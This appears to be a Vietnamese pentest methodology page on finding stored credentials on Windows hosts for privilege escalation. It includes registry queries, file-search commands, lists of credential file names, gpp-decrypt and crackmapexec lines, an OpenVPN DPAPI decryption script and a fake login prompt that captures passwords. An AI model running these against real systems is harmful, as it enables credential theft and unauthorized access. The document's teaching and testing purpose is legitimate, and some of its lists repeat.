Một công cụ xoay vòng mật khẩu tự viết có thể lưu mật khẩu administrator cục bộ đã mã hóa trong một local service, đồng thời giữ thông tin xác thực datastore trong tệp `.env` có thể đọc được hoặc cạnh binary của updater. Hãy xem xét đồng thời scheduled task, tài khoản, ACL cấu hình, listener và quyền datastore của updater. Datastore chỉ lắng nghe loopback vẫn có thể được người dùng cục bộ truy cập nếu họ có thông tin xác thực hợp lệ, nhưng chỉ xác thực thành công không chứng minh họ có quyền đọc các bản ghi liên quan. Nếu seed mã hóa hoặc key material có thể truy cập được ở cạnh ciphertext, hãy xem xét chính xác cách tạo key trước khi tin cậy vào mã hóa. Cơ chế xác định AES key từ seed bị lộ bằng Go [`math/rand`](https://pkg.go.dev/math/rand) không phù hợp để bảo vệ mật khẩu đó; tài liệu Go cho biết package này không thích hợp cho tính ngẫu nhiên nhạy cảm về bảo mật. Hãy xác nhận mọi mật khẩu đã khôi phục còn hiệu lực và thuộc về tài khoản trong nhóm local Administrators trước khi xem đó là con đường leo thang đặc quyền. Scheduled task, đường dẫn `.env` hoặc blob đã mã hóa tự chúng không chứng minh bất kỳ điều kiện nào trong số đó. Không đưa mật khẩu và key material vào kết quả liệt kê thông thường.

Dùng [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) để quản lý mật khẩu administrator cục bộ. Cơ chế lưu trữ dựa trên directory hoặc Entra cùng các quyền kiểm soát truy cập của nó khác với datastore cục bộ tùy chỉnh; tương tự, [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) quyết định liệu người dùng datastore đã xác thực có thể đọc một index cụ thể hay không.

### Archive plugin Java server và việc dùng lại thông tin xác thực

Một số plugin Java server được phân phối dưới dạng archive JAR trong thư mục `plugins` của server. Plugin tùy chỉnh có thể đọc được có thể chứa cấu hình hoặc bytecode với thông tin xác thực service được nhúng bên trong. Chỉ xem xét archive khi được phép và không đưa bí mật đã khôi phục vào kết quả liệt kê thông thường. Chỉ riêng đường dẫn plugin không chứng minh rằng có bí mật, và mật khẩu service đã khôi phục chỉ dẫn đến đặc quyền cao hơn nếu nó cũng hợp lệ cho một tài khoản có đặc quyền cao hơn. Kiểm tra ACL của các tệp liên quan và thay thông tin xác thực dùng lại bằng các bí mật riêng biệt. Xem [hướng dẫn cài đặt plugin của PaperMC](https://docs.papermc.io/paper/adding-plugins/) để biết cấu trúc thư mục và [tài liệu JAR của Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) để biết nội dung archive.

### Thông tin xác thực trong embedded database của Openfire

Bản cài đặt Openfire sử dụng embedded database có thể lưu `openfire.script` trong `Openfire\embedded-db`. Nếu tài khoản hiện tại có thể đọc tệp này, hãy kiểm tra đồng thời các bản ghi `OFUSER` và thuộc tính `passwordKey`. Tài liệu [user-provider của Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) cho biết mật khẩu có thể được lưu dưới dạng văn bản thuần hoặc được mã hóa bằng key được giữ trong thuộc tính đó. Mật khẩu đã khôi phục chỉ có ý nghĩa đối với việc leo thang đặc quyền nếu nó vẫn hợp lệ cho một danh tính có đặc quyền cao hơn; chỉ riêng tên tệp không chứng minh được quyền đọc hay việc dùng lại thông tin xác thực. Đường dẫn này chỉ là gợi ý để kiểm kê, vì vậy không đưa nội dung database và thông tin xác thực vào kết quả liệt kê thông thường.

Tệp riêng `Openfire\conf\openfire.xml` có thể tiết lộ các cổng và giao diện bind đã cấu hình cho admin console ngay cả khi đang sử dụng external database. Openfire thường bind admin console vào loopback; khi listener đang chạy, tài khoản cục bộ vẫn có thể truy cập địa chỉ đó. Hãy kiểm tra đồng thời listener thực tế, admin role được cấp quyền, chính sách tải plugin lên và danh tính của Openfire service. Admin có thể cài plugin thì có thể khiến mã plugin chạy trong context của service; điều này có thể mang đặc quyền cao nếu service chạy dưới LocalSystem. Chỉ riêng mật khẩu tài khoản trùng khớp hoặc đường dẫn cấu hình có thể đọc được không chứng minh quyền truy cập admin console hay khả năng thực thi mã. Xem [hướng dẫn cài đặt và quản lý plugin của nhà cung cấp](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) và [thuộc tính API tải plugin lên](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Cấu hình forensic management server

Cấu hình Velociraptor server, thường có tên `server.config.yaml`, có thể chứa `CA.private_key` của CA nội bộ. Nếu người dùng có đặc quyền thấp hơn đọc được key đó, họ có thể tạo API client certificate. Việc này có dẫn đến đặc quyền cao hơn hay không phụ thuộc vào user role của server, khả năng truy cập API và danh tính mà server hoặc target agent chạy dưới đó. Client configuration chứa material khác; tìm thấy một cấu hình như vậy không chứng minh có quyền truy cập CA của server. Một số triển khai giữ CA private key ngoại tuyến, vì vậy cấu hình server có thể đọc được cũng có thể không chứa signing key.

Trên Windows server, hãy kiểm tra ACL của cấu hình **server** trong thư mục cài đặt và mọi bản sao lưu được bảo vệ. Một vị trí có thể là `%ProgramFiles%\VelociraptorServer\server.config.yaml`; nếu khác, hãy dùng đường dẫn đã cấu hình cho service. Xác nhận danh tính hiện tại có thể đọc tệp và `CA.private_key` thực sự có mặt. Tránh ghi private key vào log hoặc kết quả liệt kê. Quy trình `config api_client` của nhà cung cấp sử dụng CA key để cấp client certificate, nhưng cũng cần có role hiệu lực phía server; việc tạo hoặc thay đổi role có thể cần quyền ghi datastore hoặc khởi động lại server. Danh tính server có đặc quyền hiện có vẫn có thể tạo ra một con đường truy cập ngay cả khi không thể ghi. Các truy vấn API có quyền thực thi chạy trong context liên quan của server hoặc agent, vốn có thể mang đặc quyền cao.

Bảo vệ cấu hình server và bản sao lưu bằng ACL hạn chế, giữ CA signing key ngoại tuyến khi có thể, đồng thời giới hạn API role và quyền truy cập listener. Xem [tài liệu API của Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) và [hướng dẫn cấu hình bảo mật](https://docs.velociraptor.app/docs/deployment/security/).

### Thông tin xác thực Putty

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY là một trình quản lý phiên riêng biệt. Kho dữ liệu được mã hóa gốc có thể nằm tại `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, trong khi bản sao lưu phiên được xuất có thể mang tên `sessions-backup.dat` và được lưu ở nơi khác. [Hướng dẫn xuất dữ liệu của SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) cho biết dữ liệu xuất được mã hóa bằng mật khẩu và có thể chứa các phiên, khóa, script, thẻ và mối liên kết; [diễn đàn hỗ trợ](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) xác định vị trí kho dữ liệu gốc. Trước tiên, hãy kiểm tra quyền truy cập tệp và đường dẫn. Việc tìm thấy một trong hai tệp không tiết lộ mật khẩu hoặc chứng minh rằng thông tin xác thực đã lưu còn hợp lệ hay có quyền cao hơn.

### Khóa máy chủ SSH của PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys trong registry

SSH private keys có thể được lưu trong registry key `HKCU\Software\OpenSSH\Agent\Keys`, vì vậy bạn nên kiểm tra xem trong đó có gì đáng chú ý không:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Nếu tìm thấy mục nào bên trong đường dẫn đó, nhiều khả năng đó là SSH key đã lưu. Key được lưu ở dạng mã hóa nhưng có thể dễ dàng giải mã bằng [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Tìm hiểu thêm về kỹ thuật này tại đây: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Nếu dịch vụ `ssh-agent` không chạy và bạn muốn dịch vụ tự động khởi động khi boot, hãy chạy:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Có vẻ như kỹ thuật này không còn hiệu quả. Tôi đã thử tạo một số SSH key, thêm chúng bằng `ssh-add` rồi đăng nhập qua SSH vào một máy. Registry HKCU\Software\OpenSSH\Agent\Keys không tồn tại và procmon không phát hiện việc sử dụng `dpapi.dll` trong quá trình xác thực bằng khóa bất đối xứng.

### Tệp cài đặt tự động

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bạn cũng có thể tìm các tệp này bằng **metasploit**: _post/windows/gather/enum_unattend_

Nội dung ví dụ:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Bản sao lưu SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Các tệp sao lưu Windows Imaging (`.wim`) có thể đọc được cũng chứa các hive `SAM`, `SECURITY` và `SYSTEM` ngoại tuyến. Ưu tiên kiểm tra các thư mục sao lưu hoặc image có thể truy cập cục bộ, đồng thời xem **tên các thành phần** trong image trước khi giải nén bất kỳ thứ gì; chỉ riêng tên tệp `.wim` không chứng minh rằng các hive bị lộ, và các image `install.wim`, `boot.wim` cũng như image khôi phục thông thường thường là những kết quả sai lệch. SMB share là một đường truy cập riêng và chỉ nên kiểm tra khi share đó nằm trong phạm vi. Xem hướng dẫn về [Windows image của Microsoft](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) và [tham chiếu tệp registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Thông tin xác thực trên cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tìm tệp có tên **SiteList.xml**

### Cached GPP Password

Trước đây, có một tính năng cho phép triển khai các tài khoản quản trị viên cục bộ tùy chỉnh trên một nhóm máy tính thông qua Group Policy Preferences (GPP). Tuy nhiên, phương pháp này có các lỗ hổng bảo mật nghiêm trọng. Thứ nhất, bất kỳ người dùng domain nào cũng có thể truy cập các Group Policy Object (GPO) được lưu dưới dạng tệp XML trong SYSVOL. Thứ hai, bất kỳ người dùng nào đã xác thực cũng có thể giải mã mật khẩu trong các GPP này, vốn được mã hóa bằng AES256 với một khóa mặc định đã được công bố rộng rãi. Điều này gây ra rủi ro nghiêm trọng vì có thể giúp người dùng giành được đặc quyền cao hơn.

Để giảm thiểu rủi ro này, một hàm đã được phát triển để quét các tệp GPP được lưu trong bộ nhớ đệm cục bộ, có trường "cpassword" không rỗng. Khi tìm thấy tệp như vậy, hàm sẽ giải mã mật khẩu và trả về một đối tượng PowerShell tùy chỉnh. Đối tượng này bao gồm thông tin chi tiết về GPP và vị trí tệp, giúp xác định và khắc phục lỗ hổng bảo mật này.

Tìm các tệp sau trong `C:\ProgramData\Microsoft\Group Policy\history` hoặc trong _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (trước W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Để giải mã cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Sử dụng crackmapexec để lấy mật khẩu:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Cấu hình Web IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Ví dụ về web.config có thông tin đăng nhập:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Bản sao lưu archive trong webroot của IIS

Một bản sao lưu ZIP cũ được đặt trực tiếp trong webroot đang phục vụ có thể làm lộ các tệp cấu hình trước đây và thông tin xác thực có thể tái sử dụng. Hãy kiểm tra đường dẫn vật lý được cấu hình cho trang web và xác minh archive có thực sự truy cập được qua HTTP hay không trước khi xem đây là một trường hợp lộ dữ liệu. Đường dẫn mặc định `C:\inetpub\wwwroot` chỉ là một vị trí cần kiểm tra. Có thể nhanh chóng kiểm kê cục bộ tên và kích thước mà không cần mở các archive:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Tên archive không chứng minh rằng nó chứa bí mật hoặc credential được khôi phục có quyền cao hơn.

### Thông tin xác thực OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Nhật ký

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Yêu cầu thông tin xác thực

Bạn luôn có thể **yêu cầu người dùng nhập thông tin xác thực của họ hoặc thậm chí thông tin xác thực của người dùng khác** nếu bạn nghĩ họ có thể biết thông tin đó (lưu ý rằng việc **trực tiếp yêu cầu** khách hàng cung cấp **thông tin xác thực** thực sự **rủi ro**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Tên tệp có thể chứa thông tin xác thực**

Các tệp từng chứa **mật khẩu** ở dạng **văn bản thuần** hoặc **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Biến thể danh sách tên tệp không có phần mở rộng Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Cơ sở dữ liệu Password Safe v3 thường dùng phần mở rộng `.psafe3`. Hãy xem tệp có tên khớp là ứng viên vault được mã hóa; việc tệp hiện diện không chứng minh rằng bạn có thể đọc, mở khóa hoặc sử dụng bất kỳ thông tin xác thực nào được lưu trong đó. Khi kiểm tra nơi lưu các tệp này, hãy xem các hồ sơ người dùng có thể truy cập và các thư mục gốc chia sẻ tệp đã cấu hình.

Một tệp KeePass `.kdbx` có thể đọc được cũng chỉ là manh mối về vault được mã hóa. Để mở khóa, cần có master-password thực tế cùng mọi key-file hoặc yếu tố tài khoản đã cấu hình. Nếu trong quá trình rà soát được ủy quyền phát hiện một cặp hash LM:NT trong mục nhập, hãy xác minh tài khoản được nêu và xem hash NT còn hiệu lực, được dịch vụ NTLM của mục tiêu chấp nhận hay không trước khi cân nhắc [pass-the-hash](../ntlm/README.md#pass-the-hash). Mục nhập trong vault tự nó không cấp quyền Administrator hoặc SYSTEM; quyền truy cập dịch vụ từ xa, quyền của tài khoản và bất kỳ bước thực thi dịch vụ riêng biệt nào cũng phải được đáp ứng. Khi lập danh mục, hãy báo cáo đường dẫn vault và khả năng đọc, không in cơ sở dữ liệu hoặc thông tin xác thực được lưu trong đó.

Tìm kiếm tất cả các tệp được đề xuất:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Biến thể lệnh tìm kiếm không có phần mở rộng Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Thông tin xác thực trong Thùng rác

Bạn cũng nên kiểm tra Thùng rác để tìm thông tin xác thực bên trong.

Kiểm tra các mục trong Recycle Bin mà bạn có thể truy cập để tìm bản sao lưu đã xóa và kho lưu trữ cấu hình, cũng như các tệp có tên nhắc rõ đến thông tin xác thực. Một bản sao lưu `.7z`, `.zip` hoặc `.rar` hữu ích có thể đã cũ hàng tháng và có tên tệp thông thường. Windows lưu đường dẫn gốc và thời điểm xóa trong bản ghi `$I`, còn tệp đã xóa là mục `$R` đi kèm; hãy kiểm tra metadata và quyền đọc của danh tính hiện tại trước khi mở kho lưu trữ. Khả năng hiển thị phụ thuộc vào volume, SID người dùng và quyền trên tệp, vì vậy danh sách trống không chứng minh rằng không có bản sao lưu nào có thể khôi phục. Hãy xem tên kho lưu trữ là ứng viên cần kiểm tra, chứ không phải bằng chứng rằng nó chứa secret hợp lệ.

Một tệp `.pfx` đã xóa mà bạn có thể truy cập cũng có thể là đầu mối **code-signing**. Nếu tệp chứa private key có thể truy cập, key này có thể ký một script PowerShell đã chỉnh sửa; [PowerShell yêu cầu chứng chỉ code-signing có private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), và [các quy tắc publisher của AppLocker đánh giá danh tính của người ký và phạm vi quy tắc](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Để thực thi chéo tài khoản, danh tính hiện tại phải có quyền chỉnh sửa đúng script, phải có quy tắc đang có hiệu lực chấp nhận chữ ký tạo ra cho script và tài khoản mục tiêu, đồng thời phải có scheduled task hoặc thành phần có đặc quyền cao hơn khác thực sự chạy script đó. Chỉ riêng tên tệp `.pfx`, subject của chứng chỉ hoặc script có thể ghi không chứng minh được chuỗi này. Hãy xem xét metadata, ACL, policy và lệnh được lên lịch trước khi mở dữ liệu private key hoặc kích hoạt task.

Ngoài ra, hãy kiểm tra cơ sở dữ liệu hồ sơ, ghi chú và tệp đã nhận của các messaging client mà bạn có thể truy cập để tìm đầu mối về thông tin xác thực. Bản xuất khóa khôi phục BitLocker có thể được lưu dưới dạng HTML hoặc TXT, đôi khi bên trong một kho lưu trữ sao lưu có tên cụ thể. Tài liệu như vậy có thể cấp quyền truy cập vào một data volume được mã hóa riêng, chứa các bản sao lưu cũ hơn; chỉ kiểm tra volume và kho lưu trữ khi được phép truy cập. Nếu bản sao lưu có `NTDS.dit`, việc khôi phục thông tin xác thực domain ngoại tuyến cũng cần hive `SYSTEM` tương ứng, như mô tả trong [quy trình sao lưu và nhóm đặc quyền](../active-directory-methodology/privileged-groups-and-token-privileges.md). Tên tệp và một volume bị khóa không đủ để chứng minh rằng có khóa khôi phục hoặc bản sao lưu domain có thể sử dụng.

Để **khôi phục mật khẩu** đã lưu bằng một số chương trình, bạn có thể dùng: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Bên trong registry

**Các khóa registry khác có thể chứa thông tin xác thực**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Trích xuất khóa openssh từ registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Lịch sử trình duyệt

Bạn nên kiểm tra các db lưu mật khẩu từ **Chrome hoặc Firefox**.\
Bạn nên kiểm tra các db lưu mật khẩu từ **Chrome, Edge hoặc Firefox**.\
Cũng nên kiểm tra lịch sử, dấu trang và mục yêu thích của trình duyệt, vì có thể **một số mật khẩu được** lưu ở đó.

Với profile **Default** thông thường của Edge cho người dùng hiện tại, `Login Data` nằm trong `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, còn `Local State` nằm trong thư mục `User Data` cha. [Microsoft mô tả vị trí profile mặc định](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); một profile khác hoặc policy `UserDataDir` có thể thay đổi vị trí này. Việc tệp tồn tại chỉ là manh mối về nơi lưu thông tin đăng nhập: hãy xác nhận các tệp có thể đọc được, có ngữ cảnh DPAPI của người dùng tương ứng hoặc khóa khác được phép sử dụng, và thông tin đăng nhập đã lưu có thuộc về tài khoản có đặc quyền cao hơn hay không. Chỉ liệt kê đường dẫn thì không cần mở database hay in ra mật khẩu đã giải mã.

Với Firefox, [Mozilla cho biết](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) `key4.db` và `logins.json` trong profile là cặp tệp khóa và thông tin đăng nhập được mã hóa. Việc các tệp này tồn tại chỉ là manh mối: hãy kiểm tra xem cả hai tệp có đọc được không, có mục đã lưu hay không, và Primary Password có bảo vệ khóa hay không trước khi kết luận rằng có thể sử dụng thông tin đăng nhập. Nếu thông tin đăng nhập khôi phục được thuộc về tài khoản domain, hãy xem xét riêng các quyền kiểm soát nhóm hiệu lực của tài khoản đó và [quyền đọc hoặc giải mã mật khẩu LAPS](../active-directory-methodology/laps.md) của nhóm; riêng các artifact của trình duyệt không chứng minh được có đường dẫn lên quyền administrator.

Các công cụ trích xuất mật khẩu từ trình duyệt:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Ghi đè COM DLL**

**Component Object Model (COM)** là công nghệ được xây dựng trong hệ điều hành Windows, cho phép các thành phần phần mềm viết bằng những ngôn ngữ khác nhau **giao tiếp với nhau**. Mỗi thành phần COM được **định danh bằng class ID (CLSID)** và mỗi thành phần cung cấp chức năng thông qua một hoặc nhiều interface, được định danh bằng interface ID (IID).

Các class và interface COM được định nghĩa tương ứng trong registry tại **HKEY\CLASSES\ROOT\CLSID** và **HKEY\CLASSES\ROOT\Interface**. Registry này được tạo bằng cách hợp nhất **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Bên trong các CLSID của registry này, bạn có thể tìm thấy registry con **InProcServer32**, chứa **giá trị mặc định** trỏ đến một **DLL** và một giá trị tên là **ThreadingModel**, có thể là **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single hoặc Multi) hoặc **Neutral** (Thread Neutral).

![Lịch sử trình duyệt - Ghi đè COM DLL: Bên trong các CLSID của registry này, bạn có thể tìm thấy registry con InProcServer32, chứa giá trị mặc định trỏ đến một DLL và một giá trị...](<../../images/image (729).png>)

Về cơ bản, nếu bạn có thể **ghi đè bất kỳ DLL nào** sắp được thực thi, bạn có thể **leo thang đặc quyền** nếu DLL đó được thực thi bởi một người dùng khác.

Để tìm hiểu cách kẻ tấn công sử dụng COM Hijacking làm cơ chế persistence, hãy xem:


{{#ref}}
com-hijacking.md
{{#endref}}

